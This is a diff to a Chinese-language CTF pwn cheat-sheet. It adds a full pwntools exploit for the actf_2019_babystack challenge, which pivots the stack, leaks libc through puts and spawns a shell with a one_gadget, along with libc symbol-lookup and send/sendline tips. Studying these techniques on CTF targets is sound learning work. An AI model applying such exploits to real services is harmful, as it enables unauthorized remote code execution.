@@ -31,6 +31,37 @@ print(f"64位:{shellcode}")
 - ropchain getshell+溢出绕canary:[rop64](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Pwn/rop64.md)。
 
 - ret2libc:[ret2libc](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Pwn/ret2libc.md)
+- 程序给出buf地址的栈迁移:[actf_2019_babystack](https://blog.csdn.net/mcmuyanga/article/details/112801732)
+
+```python
+from pwn import *
+context.log_level='debug'
+p=remote("node4.buuoj.cn",28412)
+leave_ret=0x0000000000400a18
+puts_plt=0x400730
+puts_got=0x601020
+main=0x4008f6
+pop_rdi=0x0000000000400ad3
+p.sendlineafter(">",str(0xe0))
+p.recvuntil('0x')
+stack_addr=int(p.recv(12),16)
+print(hex(stack_addr))
+payload=b'a'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
+payload+=b'a'*(0xd0-len(payload))  #0xd0是buf距离rbp的偏移
+payload+=p64(stack_addr)+p64(leave_ret)
+p.sendafter(">",payload) #栈迁移提的payload永远用send发送
+puts_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
+libc_base=puts_addr-526784
+one_gadget=libc_base+0x4f2c5
+p.sendlineafter(">",str(0xe0))
+p.recvuntil('0x')
+stack_addr=int(p.recv(12),16)
+payload=b'a'*8+p64(one_gadget)
+payload+=b'a'*(0xd0-len(payload))
+payload+=p64(stack_addr)+p64(leave_ret)
+p.sendafter(">",payload)
+p.interactive()
+```
 
 ### 32位
 
@@ -113,14 +144,15 @@ p.interactive()
 
 ```python
 from pwn import *
-libc=ELF("./ubuntu16/libc-2.23.so.64")
+libc=ELF("./ubuntu18/libc-2.27.so.64")
 print(f"system:{libc.sym['system']}")
 print(f"write:{libc.sym['write']}")
 print(f"puts:{libc.sym['puts']}")
 print(f"/bin/sh:{libc.search(b'/bin/sh').__next__()}")
 print(f"free:{libc.sym['free']}")
 print(f"__malloc_hook:{libc.symbols['__malloc_hook']}")
-print(f"realloc:{libc.symbols['realloc']}")                                       
+print(f"realloc:{libc.symbols['realloc']}")
+print(f"printf:{libc.symbols['printf']}")                                    
 ```
 
 8. pwn heap题模板
@@ -140,3 +172,4 @@ print(f"realloc:{libc.symbols['realloc']}")
 9. 栈溢出[计算偏移量](https://blog.csdn.net/weixin_62675330/article/details/123344386)（gdb，gdb-peda,pwntools cyclic,ida)
 10.  手写shellcode。当pwntools自动生成的shellcode过长时，就要手动将shellcode长度缩减。例题：[ciscn_2019_s_9](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/ciscn_2019_s_9.md)
 11.  32位&64位系统调用及其[系统调用号](https://introspelliam.github.io/2017/08/06/pwn/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/)。
+12.  pwntools的sendline和send函数效果不同，sendline会默认在发送的内容后面加上个换行符`\n`。有时候使用不同的会有影响，一个不行可以试试另外的。
